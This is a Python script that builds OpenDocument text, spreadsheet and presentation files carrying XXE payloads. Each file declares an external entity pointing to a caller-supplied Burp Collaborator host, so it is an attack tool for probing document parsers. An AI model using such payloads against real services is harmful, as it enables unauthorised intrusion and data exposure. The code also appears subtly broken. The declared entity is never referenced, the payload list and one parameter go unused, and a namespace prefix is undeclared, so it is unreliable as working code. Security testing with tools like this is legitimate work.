from pathlib import Path
import zipfile
import tempfile

def generate_office_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        ],
    }
    
    extensions = {
        'odt': ('office:document', 'office:text'),
        'ods': ('office:document', 'office:spreadsheet'),
        'odp': ('office:document', 'office:presentation'),
    }
    
    for ext, (root_ns, body_ns) in extensions.items():
        ext_dir = output_dir / ext
        ext_dir.mkdir(exist_ok=True)
        
        for vuln, payloads in vulns.items():
            vuln_dir = ext_dir / vuln
            vuln_dir.mkdir(exist_ok=True)
            
            for i, payload in enumerate(payloads, 1):
                odt_xxe_template = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_{ext}_{i}">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<{body_ns}>
<text:p>test</text:p>
</{body_ns}>
</office:body>
</office:document>'''
                
                output_file = vuln_dir / f"payload_{i}.{ext}"
                
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "content.xml").write_text(odt_xxe_template)
                    (temp_path / "META-INF").mkdir()
                    (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_path)
                                zip_ref.write(file_path, arcname)

